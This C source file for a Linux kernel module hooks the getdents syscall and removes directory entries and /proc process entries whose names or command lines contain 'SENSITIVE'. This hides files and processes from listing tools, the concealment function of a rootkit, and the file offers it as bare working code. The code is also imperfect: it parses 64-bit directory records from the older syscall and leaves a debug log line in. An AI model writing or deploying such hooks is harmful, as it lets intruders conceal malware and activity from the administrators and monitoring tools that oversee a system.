
#include "utils/string_utils.h"
#include "utils/proc_utils.h"
#include "utils/ftrace_utils.h"
#include "hooks/x64_sys_getdents.h"

// Pointer to the original getdents syscall
asmlinkage long (*orig_getdents)(const struct pt_regs *);

// Hook function for getdents
asmlinkage int hook_getdents(const struct pt_regs *regs)
{
    long ret; // Total bytes returned by getdents
    unsigned long offset = 0;
    unsigned long bytes_left;
    struct linux_dirent64 *d, *kdirent, *kdirent_orig;
    char *dirp = (char *)regs->si;
    
    ret = orig_getdents(regs);
    if (ret <= 0)
        return ret;

    kdirent = kmalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    kdirent_orig = kmalloc(ret, GFP_KERNEL);
    if (!kdirent_orig) {
        kfree(kdirent);
        return ret;
    }

    if (copy_from_user(kdirent, dirp, ret)) {
        kfree(kdirent);
        kfree(kdirent_orig);
        return ret;
    }
    memcpy(kdirent_orig, kdirent, ret);

    bytes_left = ret;
    while (bytes_left > 0) {
        d = (struct linux_dirent64 *)((char *)kdirent + offset);
        size_t shift_by = 0;

        if (strstr(d->d_name, "SENSITIVE")) {
            shift_by = d->d_reclen; 
            goto shift_and_iter;
        } else if (is_numeric(d->d_name)) {
            int pid;
            if (kstrtoint(d->d_name, 10, &pid) == 0) {
                char *cmdline;
                size_t cmd_size;
                cmdline = read_cmdline_from_task(pid, &cmd_size);
                if (cmdline) {
                    for (size_t i = 0; i < cmd_size; i++) {
                        if (cmdline[i] == '\0')
                            cmdline[i] = ' ';
                    }
                    if (strstr(cmdline, "SENSITIVE")) {
                        kfree(cmdline);
                        shift_by = d->d_reclen;
                        goto shift_and_iter;
                    }
                    kfree(cmdline);
                }            
            }
        }

shift_and_iter:
        if (shift_by > 0) {
            memmove(d, (char *)d + shift_by, bytes_left - shift_by);
            ret -= shift_by;
            bytes_left -= shift_by;
        } else {
            offset += d->d_reclen;
            bytes_left -= d->d_reclen;
            pr_info("hello from %s\n", d->d_name);
        }
        continue;
    }

    if (copy_to_user(dirp, kdirent, ret)) {
        if (copy_to_user(dirp, kdirent_orig, ret)) {} // do nothing - suppress warnings
        kfree(kdirent_orig);
        kfree(kdirent);
        return ret;
    }

    kfree(kdirent_orig);
    kfree(kdirent);
    return ret;
}

